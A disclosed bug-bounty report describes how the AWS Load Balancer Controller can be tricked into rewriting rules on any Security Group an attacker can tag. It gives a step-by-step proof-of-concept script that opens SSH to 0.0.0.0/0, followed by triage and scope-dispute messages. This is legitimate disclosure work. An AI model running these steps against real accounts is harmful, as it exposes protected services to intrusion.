title: AWS Load Balancer Controller can be used by an attacker to modify rules of any Security Group that they are able to tag
vulnerability_information:
Report Submission Form

## Summary:
The IAM Policy of AWS Load Balancer Controller allows it to modify rules of any SG on the AWS Account. This is legitimately used to manage Security Groups created by the controller when an Ingress resource doesn’t explicit a SG. Annotations can be added to the Ingress to change inbound rules of the managed SG.

An attacker with access to some namespace on a K8s cluster with AWS Load Balancer Controller properly installed and configured, is able to trick the controller into modifying rules of any SG that the attacker is able to tag.

AWS Load Balancer Controller uses three tags to associate a SG on AWS to the supposed managed SG created for an ALB: `elbv2.k8s.aws/cluster`, `ingress.k8s.aws/stack`, and `ingress.k8s.aws/resource`. When there are multiple SGs that match the expected tag values, the controller attaches the first one returned by the AWS SDK to the ALB and deletes the other ones. The API call returns SGs sorted by their respective ids.

If an arbitrary SG is tagged with the values expected by AWS Load Balancer Controller for some Ingress before its creation, as soon the Ingress is created the controller thinks that the targeted SG is a managed one. This allows an attacker to use annotations `alb.ingress.kubernetes.io/listen-ports` and `alb.ingress.kubernetes.io/inbound-cidrs` on the Ingress resource to modify inbound rules of unmanaged SGs, what should not be possible.

## Kubernetes Version:
version.Info{Major:"1", Minor:"20+", GitVersion:"v1.20.4-eks-6b7464", GitCommit:"6b746440c04cb81db4426842b4ae65c3f7035e53", GitTreeState:"clean", BuildDate:"2021-03-19T19:33:03Z", GoVersion:"go1.15.8", Compiler:"gc", Platform:"linux/amd64"}

## Component Version:
AWS Load Balancer Controller v2.2.0

## Steps To Reproduce:

```bash
VPC_ID=vpc-00123456789abcdef
CLUSTER_NAME=kind

# Developer legitimatly creates a security group to protect some service
UNMANAGED_SG_ID=$(aws ec2 create-security-group --description unmanaged-sg --group-name unmanaged-sg --vpc-id ${VPC_ID} | jq -r .GroupId)

# Attacker tags the unmanaged security group with values expected by the AWS Load Balancer Controller
aws ec2 create-tags --resources ${UNMANAGED_SG_ID} --tags "Key=elbv2.k8s.aws/cluster,Value=${CLUSTER_NAME}" "Key=ingress.k8s.aws/stack,Value=echoserver/echoserver" "Key=ingress.k8s.aws/resource,Value=ManagedLBSecurityGroup"

# Attacker creates an Ingress with a combination of name, namespace, and cluster that matches the tags added to the unmanaged SG
# listen-ports and inbound-cidrs annotations are set with values related to the inbound rule that will be created on the security group
aws eks update-kubeconfig --name ${CLUSTER_NAME}
cat <<- EOF | kubectl apply -f -
apiVersion: v1
kind: Service
metadata:
  namespace: echoserver
  name: echoserver
spec:
  selector:
    app: echoserver
  ports:
    - name: http
      protocol: TCP
      port: 8080
---
apiVersion: extensions/v1beta1
kind: Ingress
metadata:
  namespace: echoserver
  name: echoserver
  annotations:
    kubernetes.io/ingress.class: alb
    alb.ingress.kubernetes.io/target-type: ip
    alb.ingress.kubernetes.io/listen-ports: '[{"HTTP":22}]'
    alb.ingress.kubernetes.io/inbound-cidrs: 0.0.0.0/0
spec:
  rules:
    - host: echoserver.example.com
      http:
        paths:
          - backend:
              serviceName: echoserver
              servicePort: 8080
EOF
sleep 15

# Inbound rules were created on the unmanaged security group, allowing ingress SSH traffic (TCP Port 22) from anywhere (CIDR 0.0.0.0/0)
aws ec2 describe-security-groups --group-id ${UNMANAGED_SG_ID}
```

## Impact

An attacker is capable of gaining access to all network resources protected by some Security Group and is also able to expose critical services to the Internet if they are on a public subnet. A denial of service attack can be performed by blocking traffic of legitimate clients to resources with SGs attached.

activities.message:
Hi @t0rr3sp3dr0,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@tuxedo
Hi @t0rr3sp3dr0 - Is there any additional information you can provide on how to set up the environment to run your script?

Sure, @tuxedo!

For simplicity, we can execute all AWS CLI commands using a single user or role that is allowed to run `aws ec2 create-tags`, `aws ec2 create-security-group`, and `aws ec2 describe-security-groups`. Although an attacker would only need to run `aws ec2 create-tags`.

Additionally, access to a namespace where an attacker could create a Service and an Ingress on a K8s Cluster that has AWS Load Balancer Controller installed and properly configured is required. In the script, I’ve used an EKS cluster, but it should work on any cluster as long as the controller has the proper IAM credentials.

Assuming the AWS Account where you are performing the tests has a single VPC and you have a single EKS cluster properly configured, you should be able to acquire the proper values for `VPC_ID` and `CLUSTER_NAME` by running the following commands:

```bash
VPC_ID=$(aws ec2 describe-vpcs | jq -r '.Vpcs[0].VpcId')
CLUSTER_NAME=$(aws eks list-clusters | jq -r '.clusters[0]')
```

It is important to notice that the `CLUSTER_NAME` value used by the controller may not match the name of the EKS cluster. This depends on the value for the parameter `--cluster-name` set as an argument on the Deployment of the AWS Load Balancer Controller. If you set the arguments as shown below, replacing `$(CLUSTER_NAME)` with the value acquired for `CLUSTER_NAME` when running the commands above, you should be able to follow my _Steps To Reproduce_ script with no problem.

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  namespace: kube-system
  name: aws-load-balancer-controller
spec:
  template:
    spec:
      containers:
        - name: controller
          args:
            - --ingress-class=alb
            - --cluster-name=$(CLUSTER_NAME)
```

Hi @tuxedo,

This report has been under triage for over a month. Do you have any updates?

Best regards,
Pedro Tôrres

Hi @t0rr3sp3dr0,

Sorry for the delay! We are still looking into this report and will update you when I have additional information to share. Thanks for your patience!

Regards,
@tuxedo
Hi @t0rr3sp3dr0 - I'm discussing this submission internally with the Kubernetes team. You will be updated as soon as there is additional information to share. Thanks for your patience!

Hey @tuxedo,

Were you able to discuss this submission with the Kubernetes team? Is there any additional information I can provide to help you?

Best regards,
Pedro Tôrres

@t0rr3sp3dr0,
Thanks a lot for this and the other similar report; we're currently working with the maintainers of the controller. Will post back with more info when we have it.

Hi @tabbysable,

Thanks for the reply!

Does it mean this report got accepted and you are working with them on a fix? Or it means that you are still checking if this will be accepted or not?

For me, this report is still showing as under triage. While the other 2 got acknowledged and I’m just waiting for the fix.

Best regards,
Pedro Tôrres

Hi,

Can we mark this submission as `Triaged`? It is still in the `New` state.

I didn't get a reply from @tabbysable but her message indicates that the maintainers are at least aware of the problem.

Best regards,
Pedro Tôrres

Pedro,

Thanks for your patience and continued help improving the security of Kubernetes.

Hi @tabbysable,

I would like you to reconsider the confidentiality and privilege scores on the severity calculation.

By changing a security group you may be able to access sensitive information that was protected by it. It's not uncommon to find databases like Redis and MongoDB solely protected by a firewall rule. There are also applications that can be authenticated through a proxy that injects a header trusted by the application, generally containing the user id, and in that case, the security group is the only thing preventing someone from bypassing authentication; Grafana and Tableau are some examples of applications that support this. In both scenarios, an attacker would be able to exfiltrate just by having network connectivity to these resources.

Regarding the privilege needed for an attacker to exploit this vulnerability, an attacker would only to create an Ingress on any namespace and tag the target Security Group. It's very common to allow users to create any kind of resource inside a namespace, so I consider it a low privilege requirement. Tagging resources on AWS is also a very reasonable access to have and commonly used for billing and governance, you don't even need `ec2:CreateTags` permission, you can tag resources via the Resource Groups & Tag Editor with `tag:TagResources` permission.

Best regards,
Pedro Tôrres

Pedro,

Thanks for sharing your concerns about the severity calculation for this one. We're discussing it internally and will get back to you.

Hi Pedro, thank you for your report. After reviewing your report, the attack relies on AWS API access and the ability to tag Security Groups outside of Kubernetes with the load balancer's expected tags. The security of access to AWS APIs and resources is outside the scope of this project, and is not eligible for bounty. If you find any other issues related to this controller, please file a new issue.
Marking report as not applicable, as the attack vector is outside of the scope of the project

Hi @mhausler,

I ask you to reconsider this decision. The attack is only possible because the controller exists and it manipulates resources outside Kubernetes via the AWS API. This is not something that can be addressed outside the controller. The controller code needs to be changed to fix this issue.

In other words, AWS is providing a controller that you install on Kubernetes and it allows you to escalate privileges by tagging some resource on EC2. The problem is not the tag action, but the controller that interprets this action in an insecure way.

If you still believe this is not an issue that needs to be addressed, then let's disclose it. People using the controller deserve to know the risks associated with it to protect themselves in some way.

Best regards,
Pedro Tôrres
Requesting disclosure, as the attack relies on EC2 SG tagging permissions outside the scope of the controller.
